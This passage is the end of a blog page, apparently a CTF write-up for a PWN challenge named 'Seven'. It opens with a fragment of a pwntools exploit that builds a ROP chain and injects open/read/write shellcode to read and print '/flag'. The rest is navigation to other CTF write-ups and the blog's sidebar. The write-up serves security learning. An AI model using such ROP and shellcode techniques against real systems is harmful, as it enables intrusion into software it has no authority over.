class="hljs-string">&#x27;read&#x27;</span>])+p64(gadget1)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p64(ret)+p64(<span class="hljs-number">0x600008</span>)<br>    <br>    psl(p1)<br>    flag_str = <span class="hljs-number">0x600000</span><br>    flag_content = <span class="hljs-number">0x600f00</span><br>    orw = <span class="hljs-string">b&#x27;/flag\x00\x00\x00&#x27;</span><br>    orw += asm(shellcraft.<span class="hljs-built_in">open</span>(flag_str))<br>    orw += asm(shellcraft.read(<span class="hljs-number">3</span>, flag_content, <span class="hljs-number">0x80</span>))<br>    orw += asm(shellcraft.write(<span class="hljs-number">1</span>, flag_content, <span class="hljs-number">0x80</span>))<br>    pause()<br>    psl(orw)<br>    <br>    p.interactive()<br>exp()<br></code></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://cao-png.github.io/">cao-png.github.io</a>感谢提供的思路</p>
</blockquote>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/about/links/2025/12/22/2025%E5%B9%B4%E6%B1%9F%E8%A5%BF%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E5%86%B3%E8%B5%9B-PWN-gitlab">← Next 2025年江西省大学生信息安全技术大赛-决赛-PWN-Gitlab</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/about/links/2025/12/22/%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%8F%A4%E5%89%91%E5%B1%B1-PWN-ezuaf">第三届古剑山-PWN-Ezuaf Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo" style="margin:0;border-radius:0;"></a><h1 id="Dr"><a href="/">Langx</a></h1><div id="description"><p>this world is pretty</p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/langx1ng"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" href="mailto:2867485668@qq.com"><i class="fa fa-envelope" alt="E-Mail"></i></a><a class="social" target="_blank" rel="noopener" href="https://wpa.qq.com/msgrd?v=3&amp;uin=2867485668&amp;site=qq&amp;menu=yes"><i class="fa-brands fa-qq" alt="QQ"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2025%E6%98%9F%E8%8A%92%E6%9D%AF-PWN-Seven"><span class="toc-number">1.</span> <span class="toc-text">2025星芒杯-PWN-Seven</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>